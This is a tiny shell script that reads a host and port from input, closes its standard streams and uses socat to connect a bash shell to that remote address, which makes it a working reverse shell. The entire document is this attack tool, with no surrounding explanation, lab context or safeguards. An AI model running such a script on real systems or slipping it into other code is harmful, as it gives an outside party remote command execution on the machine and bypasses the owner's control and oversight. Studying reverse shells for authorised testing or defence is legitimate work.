#!/bin/sh

# Read the target host:port
read -r TARGET
# Close stdio
exec <&- >&- 2>&-
# Connect a shell
socat exec:/bin/bash,stderr tcp:$TARGET,connect-timeout=3
